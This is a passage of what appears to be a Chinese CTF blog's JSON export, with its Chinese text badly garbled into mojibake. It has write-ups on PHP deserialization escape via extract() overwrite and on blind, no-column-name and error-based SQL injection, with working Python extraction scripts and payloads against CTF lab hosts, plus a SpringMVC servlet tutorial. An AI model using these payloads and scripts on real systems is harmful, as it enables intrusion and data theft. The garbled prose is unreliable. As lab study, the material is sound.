äº†å®é™…ä¸Šè¿›å…¥çš„ä¹Ÿå°±å‰©ä¸‹O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc[ä¸­é—´çš„æ²¡äº†]&quot;;&#125;é‚£å‡è®¾æˆ‘ä»¬çš„passå†™æˆ:&quot;;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;,å†é‡æ–°æ‹¼æ¥ä¹‹åå°±å˜å˜æˆäº†ï¼O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;&quot;;&#125;è¿™æ ·çš„è¯å°±åˆæ­£å¸¸äº†ï¼ï¼ï¼ è¿‡æ»¤ä¹‹ååªå‰©ä¸‹ï¼š 1O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:4:&quot;asds&quot;;&#125;&quot;;&#125; ä¸€äº›é­”æœ¯æ–¹æ³•ï¼š 1234567891011__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘","categories":[],"tags":[{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"}]},{"title":"2019å®‰è¯¢æ¯easyseailize","slug":"2019å®‰è¯¢æ¯easyseailize","date":"2020-11-20T09:19:39.000Z","updated":"2020-11-20T13:33:52.945Z","comments":true,"path":"2020/11/20/2019å®‰è¯¢æ¯easyseailize/","link":"","permalink":"http://example.com/2020/11/20/2019%E5%AE%89%E8%AF%A2%E6%9D%AFeasyseailize/","excerpt":"","text":"1.è€ƒç‚¹ååºåˆ—åŒ–ï¼Œå˜é‡è¦†ç›–ï¼Œä»£ç å®¡è®¡ 2å‡ºå‘æ€è·¯è¿™é“é¢˜ç›®å¼€å±€å°±æ”¾å‡ºæ¥äº†æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);echo $_SESSION[&quot;user&quot;];if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; å…ˆçœ‹æœ€ä¸‹é¢çš„ï¼Œè®©ä½ å»phpinfoä¸‹é¢çœ‹ï¼Œå…¶å®èƒ½æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼š å†ä¸Šä¸‹æŸ¥æ‰¾ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹è§ä¸€ä¸ªfile_get_contentså‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å°±å¾ˆæ˜ç¡® æ§åˆ¶imgå˜é‡ å‘ä¸Šçœ‹ï¼Œé‚£ä¹ˆå°±æ˜¯æ§åˆ¶$serialize_info ç»§ç»­å‘ä¸Šï¼Œå°±æ˜¯æ§åˆ¶$_SESSION é‚£æˆ‘ä»¬çš„ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯å°è¯•æ§åˆ¶$_SESSIONçš„å€¼ï¼Œè¿›è¡Œååºåˆ—åŒ–çš„é‚£ä¹ˆä¸€ä¸ªæ“ä½œï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„å‚æ•°ä¸€ä¸ªä¹Ÿæ²¡æœ‰ï¼Œå¥½åœ¨é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªåˆ©ç”¨ç‚¹ åˆ©ç”¨ç‚¹extract1extract($_POST); è¯¥å‡½æ•°å¯ä»¥å…è®¸åŠ¨æ€çš„å˜é‡ï¼ŒPHPä¸­ä½¿ç”¨å®ƒçš„åŸæ„æ˜¯æƒ³è¦ä»¤ç¨‹åºå‘˜å¯ä»¥ç¨‹åºä¸­åŠ¨æ€çš„è°ƒæ•´å¸¸é‡ï¼Œä½†æ˜¯å¦‚æœå…è®¸ç”¨æˆ·æ¥è°ƒç”¨çš„è¯å°±ä¼šå‡ºç°å˜é‡è¦†ç›–çš„é—®é¢˜ï¼Œ åˆ©ç”¨æ–¹å¼ä¸ºæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„åœ°æ–¹ï¼Œå¦‚æœæ˜¯å…è®¸ç”¨æˆ·è‡ªå®šä¹‰çš„ä¿®æ”¹$_POSTçš„å†…å®¹ï¼Œè€Œæˆ‘ä»¬æƒ³è¦ä¿®æ”¹sessionå½“ä¸­çš„å€¼çš„æ—¶å€™ï¼Œåªéœ€è¦ 1_SESSION[user]=admin å¦‚æœæƒ³è¦ä¿®æ”¹getå½“ä¸­çš„å‚æ•°å®é™…ä¸Šä¹Ÿæ˜¯å¯ä»¥çš„ 1_GET[admin]=123 ä¿®æ”¹éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š ä¾‹å­å¦‚ä¸‹ï¼š å¯ä»¥çœ‹è§æˆ‘ä»¬çš„sessionä¸ºguestï¼Œåˆ©ç”¨extractå‡½æ•°æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œè¦†ç›–äº†ï¼š ååºåˆ—åŒ–é€ƒé€¸12345function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125; æŸ¥çœ‹è¿™æ®µä»£ç ï¼Œä¹ä¸€çœ‹å¥½åƒæ˜¯å¯¹æˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„ä¸œè¥¿è¿›è¡Œäº†ç›¸å½“ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä½†æ˜¯å®ƒä»…ä»…æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å€¼æ›¿æ¢ä¸ºç©ºï¼Œè€Œä¸æ˜¯dieæ‰ç¨‹åºï¼Œç»“åˆååºåˆ—åŒ–çš„é€ƒé€¸ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾çš„è¾“å‡ºæˆ‘ä»¬éœ€è¦çš„å†…å®¹ é¦–å…ˆéœ€è¦æ˜ç™½è¿™é“é¢˜ç›®åˆ°åº•åšäº†ä»€ä¹ˆï¼Œå‡è®¾æˆ‘ä»¬ä»€ä¹ˆå‚æ•°ä¹Ÿä¸ä¼ å…¥ï¼Œæˆ‘ä»¬çœ‹è§çš„å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; æ­£å¸¸æ¥è¯´ï¼Œæˆ‘ä»¬æ˜¯ä¸å¯ä»¥æ§åˆ¶è¿™é‡Œé¢çš„å€¼çš„ï¼Œä½†æ˜¯é€šè¿‡å˜é‡è¦†ç›–æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶å…¶ä¸­çš„å€¼äº†ï¼Œä½†æ˜¯åˆæ°æ°å› ä¸ºæ˜¯å˜é‡è¦†ç›–çš„åŸå› ï¼Œæˆ‘ä»¬å¦‚æœå•çº¯çš„å†™å…¥functionä¼šå› ä¸ºå‰é¢å·²ç»æœ‰functionäº†è€Œæ— æ³•å†™å…¥ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æŠŠå‰é¢çš„ä¸œè¥¿åƒæ‰è‡ªå·±å†™å…¥ï¼è¿™æ ·å°±å¯ä»¥äº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ è€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„userå½“ä¸­çš„guestï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åƒæ‰çš„å­—ç¬¦ä¸²é”®ä½ 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:4:&quot;gura&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 1_SESSION[user]=flagflagflagflagflagflagflag&amp;_SESSION[function]=1bbbb&quot;;s:8:&quot;function&quot;;s:5:&quot;ysllz&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; è¯»åˆ°äº†æ–‡ä»¶ï¼ŒæˆåŠŸï¼Œ","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"SpringMVC","slug":"SpringMVC","date":"2020-11-19T12:52:05.000Z","updated":"2020-11-19T13:17:53.261Z","comments":true,"path":"2020/11/19/SpringMVC/","link":"","permalink":"http://example.com/2020/11/19/SpringMVC/","excerpt":"","text":"æ³¨å…¥äº†ä¸€å¤©çœŸçš„æ•´çš„äººéƒ½å¤´æ™•çœ¼èŠ±çš„ï¼Œå­¦ä¸€ä¸‹å¼€å‘æ”¾æ¾ä¸€ä¸‹ SpringMVC-01æˆ‘ä»¬é¦–å…ˆç¬¬ä¸€æ­¥å…ˆå¤ä¹ Servletå’Œtomcat æˆ‘ä»¬è€æ ·å­ï¼Œä¸‰å±‚æ¶æ„ï¼Œç„¶åå¯¼å…¥åŒ…ä»€ä¹ˆçš„ ç±»çš„ç»„ç»‡ï¼š æ³¨æ„è¯·åˆ›å»ºMAVENé¡¹ç›® ä¹‹åæ˜¯å¯¼åŒ…ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/org.junit.jupiter/junit-jupiter-api --&gt; &lt;dependency&gt; &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt; &lt;artifactId&gt;junit-jupiter-api&lt;/artifactId&gt; &lt;version&gt;5.7.0&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-core --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;5.2.10.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet.jsp-api&lt;/artifactId&gt; &lt;version&gt;2.3.1&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; å†ä¹‹åæ˜¯å†™ä»£ç ï¼š HelloServletï¼š 123456789101112131415161718192021222324252627282930package com.gura.servlet;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;public class HelloServlet extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;// è·å–å‰ç«¯å‚æ•° String method =req.getParameter(&quot;method&quot;); if (method.equals(&quot;add&quot;))&#123; req.getSession().setAttribute(&quot;msg&quot;,&quot;æ‰§è¡Œäº†æ·»åŠ æ–¹æ³•&quot;); &#125; if (method.equals(&quot;delete&quot;))&#123; req.getSession().setAttribute(&quot;msg&quot;,&quot;æ‰§è¡Œäº†delteæ–¹æ³•&quot;); &#125; //è°ƒç”¨ä¸šåŠ¡// è§†å›¾è½¬å‘æˆ–è€…é‡å®šå‘ req.getRequestDispatcher(&quot;/WEB-INF/jsp/test.jsp&quot;).forward(req,resp); &#125; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req,resp); &#125;&#125; test.jsp: 12345678910111213141516&lt;%-- Created by IntelliJ IDEA. User: 75620 Date: 2020/11/19 Time: 20:46 To change this template use File | Settings | File Templates.--%&gt;&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;$&#123;msg&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; web.xml: 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt; &lt;servlet&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;servlet-class&gt;com.gura.servlet.HelloServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;hello&lt;/servlet-name&gt; &lt;url-pattern&gt;/hello&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;session-config&gt; &lt;session-timeout&gt;15&lt;/session-timeout&gt; &lt;/session-config&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; è¿™é‡Œå®ç°äº†ä¸€æ¬¡å¯¹æ¥å£çš„å¤„ç†çš„è½¬å‘ æµ‹è¯•ä»£ç æˆåŠŸ","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"æå®¢å¤§æŒ‘æˆ˜FinalSql","slug":"æå®¢å¤§æŒ‘æˆ˜FinalSql","date":"2020-11-19T08:40:54.000Z","updated":"2020-11-19T11:41:09.490Z","comments":true,"path":"2020/11/19/æå®¢å¤§æŒ‘æˆ˜FinalSql/","link":"","permalink":"http://example.com/2020/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98FinalSql/","excerpt":"","text":"1.è€ƒç‚¹ç›²æ³¨,å­¦ä¹ åˆ°äº†æ–°çš„å§¿åŠ¿ï¼Œå½“æˆ‘ä»¬çš„ifè¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡^çš„æ–¹å¼æ¥æ“ä½œ ?id=1=(è¡¨è¾¾å¼)=1 ?id=1^(è¡¨è¾¾å¼)^1 ^ åœ¨mysqlå½“ä¸­ä»£è¡¨çš„æ˜¯ä½å¼‚æˆ–çš„æ„æ€ï¼Œå‘ƒï¼Ÿç™¾åº¦äº†ä¸€ä¸‹å¤§æ¦‚æ˜ç™½äº†ä¸€äº› ä¸¤ä¸ªæ•°ç›¸åŒå¾—0ï¼Œä¸åŒå¾—1ï¼›é‚£æˆ‘ä»¬è¿›ä¸€æ­¥æ‹“å±•æ€è·¯ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ªè¡¨è¾¾å¼ç›¸åŒçš„æ—¶å€™å°±ä¼šè¿”å›1ï¼Œä¸åŒçš„æ—¶å€™å°±ä¼šè¿”å›0 æ‹“å±•æ€è·¯ä¹‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š æ„Ÿè§‰è¿˜æ˜¯ç”¨ç­‰å·æ¯”è¾ƒå¥½ç†è§£å•Š å½“ä¸¤ä¸ª=å·å¤¹åœ¨ä¸€èµ·çš„æ—¶å€™ æ¡ä»¶æˆç«‹çš„æ—¶å€™å°±è¿”å›å‰é¢çš„åˆ¤æ–­ç»“æœï¼Œä¸æˆç«‹çš„è¯å°±è¿”å›å…¨éƒ¨çš„ç»“æœäº†ã€‚ äºæ˜¯æ„é€ æ³¨å…¥è¯­å¥ï¼š 1http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(database(),1,1))&gt;102)&#x3D;1 å¾—åˆ°æ•°æ®åº“çš„åå­—ï¼šgeek æ¥ä¸‹æ¥æ³¨å…¥è¡¨åï¼š 1http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)&#x3D;database()),1,1))&gt;102)&#x3D;1 11&#x3D;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;geek&#39;)),1,1))&gt;1)&#x3D;1 å¾—åˆ°è¡¨åï¼š 1F1naI1y,Flaaaaag æ³¨å…¥å­—æ®µåï¼š id,username,password flagåœ¨F1naI1yé‡Œé¢ æœ€ç»ˆexpï¼š 1234567891011121314151617181920212223242526import requests, string, sysurl = &quot;http://7e5cde2c-f8e0-4059-a2e2-6121476516cc.node3.buuoj.cn/search.php&quot;# data = &quot;id=if(ascii( substr( database() ,1,1) )&gt;100,1,2)#&quot;# stringlist = string.digits + string.ascii_lettersflag = &quot;&quot;for i in range(1, 999): # for j in stringlist: for j in range(40, 126): # sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j) # sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j) # sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format( # i, j) sql = &quot;1=(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j) data = &#123;&quot;id&quot;: sql&#125; res = requests.get(url=url, params=data) # print(data) if &quot;ingyingying~ Not this as wel&quot; in res.text: print(j) flag += chr(j) print(flag) break if j == 125: sys.exit() å¾—åˆ°ç­”æ¡ˆï¼š","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"GYCTF2020Ezsqli","slug":"GYCTF2020Ezsqli","date":"2020-11-19T04:38:48.000Z","updated":"2020-12-03T05:42:55.989Z","comments":true,"path":"2020/11/19/GYCTF2020Ezsqli/","link":"","permalink":"http://example.com/2020/11/19/GYCTF2020Ezsqli/","excerpt":"","text":"è€ƒç‚¹ç›²æ³¨ï¼Œæ— åˆ—åæ³¨å…¥ã€‚ä¸€æ ·çš„å°è¯•æ„é€ æ³¨å…¥è¯­å¥ä¹‹åï¼š è¿™é‡Œåˆ©ç”¨äº†ç½‘ç«™çš„ç‰¹æ€§ï¼Œå½“æ¡ä»¶æˆç«‹çš„æ—¶å€™è¿”å›NU1l,å¤±è´¥çš„æ—¶å€™ï¼Œå°±æ˜¯V&amp;N 1234567891011121314151617181920import requests, stringurl = &quot;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&quot;# data = &quot;id=if(ascii( substr( database() ,1,1) )&gt;100,1,2)#&quot;# stringlist = string.digits + string.ascii_lettersflag = &quot;&quot;for i in range(1, 999): # for j in stringlist: for j in range(40, 126): sql = &quot;if(ascii( substr( database() ,&#123;&#125;,1) )&gt;&#123;&#125;,1,2)#&quot;.format(i, j) data = &#123;&quot;id&quot;: sql&#125; res = requests.post(url=url, data=data) # print(data) if &quot;V&amp;N&quot; in res.text: print(j) flag += chr(j) print(flag) break æ³¨å…¥å¾—åˆ°è¡¨åï¼š 1givf_grasdpa_pa_pa_pa ä¹‹åè¿›ä¸€æ­¥å´å¾ˆéš¾äº†ï¼Œå› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“è¯¥æ€ä¹ˆæŸ¥è¯¢ä¸œè¥¿ï¼Œå› ä¸ºinformation_schmeaè¢«è¿‡æ»¤æ‰äº†ï¼Œæ•…åªèƒ½è€ƒè™‘å…¶ä»–æ³¨å…¥ï¼Œåˆ†åˆ«å°è¯•å¯¹innobå’Œsysåº“è¿›è¡Œæ³¨å…¥ï¼ŒæŒ¨ä¸ªå°è¯•ï¼š 1234mysql.innodb_table_statssys.schema_auto_increment_columns sys.schema_table_statistics_with_buffersys.x$schema_flattened_keys æ„é€ è¯­å¥ï¼š 1select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database() æ³¨å…¥è¡¨ï¼š 1sql =&quot;if(ascii( substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database() ),&#123;&#125;,1) )&gt;&#123;&#125;,1,2)#&quot;.format(i, j) # æ•°æ®è¡¨ å¾—åˆ°ç»“æœ: 1users233333333333333,f1ag_1s_h3r3_hhhhh ä½†æ˜¯ä¹‹åæˆ‘ä»¬å› ä¸ºè¢«è¿‡æ»¤äº†oræ— æ³•è·å–è‡ªåŠ¨çš„åå­—ï¼Œåªèƒ½è¿›è¡Œæ— åˆ—åæ³¨å…¥çš„æ“ä½œäº† é¦–å…ˆå­¦ä¹ äº†ä¸€æ³¢å¸ˆå‚…çš„æ€è·¯ï¼š åˆ©ç”¨asciiä½çš„åç§»ï¼Œåœ¨æœ¬åœ°è¿›è¡Œå°è¯• è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ å¦‚æœselect b &gt;select aï¼Œå¦‚æœselect b &gt; select aè¿”å›çš„0 ä¹‹åè¿˜å¯ä»¥è¿›ä¸€æ­¥çš„å»æ„é€ æ‹¼æ¥ï¼š é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ„é€ å‡ºflagä¹‹åä¸€æ­¥ä¸€æ­¥çš„ä½ç§»æ¨ç®—å³å¯ è¿™é‡Œè´´ä¸Šå¸ˆå‚…çš„è„šæœ¬ï¼š 12345678910111213141516171819import requestsurl = &#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;def add(flag): res = &#x27;&#x27; res += flag return resflag = &#x27;&#x27;for i in range(1,200): for char in range(32, 128): hexchar = add(flag + chr(char)) payload = &#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(hexchar) #print(payload) data = &#123;&#x27;id&#x27;:payload&#125; r = requests.post(url=url, data=data) text = r.text if &#x27;Nu1L&#x27; in r.text: flag += chr(char-1) print(flag) break é™¤æ­¤ä¹‹å¤–è¿˜æœ‰äºŒåˆ†æ³•ï¼š 123456789101112131415161718192021222324252627282930import requestsurl=&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;#give_grandpa_pa_pa_papayload_flag=&#x27;1^((1,\\&#x27;&#123;&#125;\\&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;flag =&#x27;&#x27;for i in range(1,100): low = 32 high = 132 mid = (low + high) //2 while(low &lt; high): k = flag+chr(mid) payload = payload_flag.format(k) data=&#123;&quot;id&quot;: payload&#125; print(payload) r = requests.post(url=url,data=data) if &#x27;Nu1L&#x27; in r.text: low = mid+1 else: high = mid mid = (low+high) //2 if mid ==33: break flag +=chr(mid-1) print(flag.lower())#å› ä¸ºå‡ºæ¥çš„flagæ˜¯å¤§å†™ï¼Œè¿™è¾¹å…¨éƒ¨è½¬ä¸ºå°å†™ print(flag.lower()) è®°ä¸€ä¸‹æŠ¥é”™æ³¨å…¥1admin&#x27; and extractvalue(0x0a,concat(0x0a,(sELect group_concat(table_name) from information_schema.tables where table_schema=database() ))) # 1admin&#x27; and extractvalue(0x0a,concat(0x0a,(sELect group_concat(column_name) from information_schema.columns where table_name=&#x27;fl4g&#x27; ))) #","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"RCTF2015EasySQL","slug":"RCTF2015EasySQL","date":"2020-11-18T09:57:30.000Z","updated":"2020-12-08T13:51:35.524Z","comments":true,"path":"2020/11/18/RCTF2015EasySQL/","link":"","permalink":"http://example.com/2020/11/18/RCTF2015EasySQL/","excerpt":"","text":"è€ƒç‚¹ï¼šä¸€ä¸ªSQLæ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥+æŠ¥é”™æ³¨å…¥ å½“æˆ‘ä»¬æ³¨å†Œç”¨æˆ·ä¿®æ”¹å¯†ç çš„æ—¶å€™ä¾¿ä¼šè§¦å‘ è¿‡ç¨‹ï¼šæˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹è¢«è¿‡æ»¤äº†ä»€ä¹ˆï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198length +handlerlikeselect sleepdatabasedeletehavingoras-~BENCHMARKlimitleftselectinsertsys.schema_auto_increment_columnsjoinright#&amp;&amp;&amp;\\handler-- -----+INFORMATION--;!%+xor&lt;&gt;(&gt;&lt;).^=ANDBYCASTCOLUMNCOUNTCREATEENDcase&#x27;1&#x27;=&#x27;1whenadmin&#x27;&quot;length +lengthREVERSEasciiselect databaseleftright&#x27;union||oorr/////**/*/**/ananddGROUPHAVINGIFINTOJOINLEAVELEFTLEVELsleepLIKENAMESNEXTNULLOFON|infromation_schemauserORORDERORDSCHEMASELECTSETTABLETHENUPDATEUSERUSINGVALUEVALUESWHENWHEREADDANDpreparesetupdatedeletedropinsetCASTCOLUMNCONCATGROUP_CONCATgroup_concatCREATEDATABASEDATABASESalterDELETEDROPfloorrand()information_schema.tablesTABLE_SCHEMA%dfconcat_ws()concatLIMITORDONextractvalueorder CAST()byORDEROUTFILERENAMEREPLACESCHEMASELECTSETupdatexmlSHOWSQLTABLETHENTRUEinstrbenchmarkformatbinsubstringordUPDATEVALUESVARCHARVERSIONWHENWHERE/*` ,users%0a%0bmidforBEFOREREGEXPRLIKEinsys 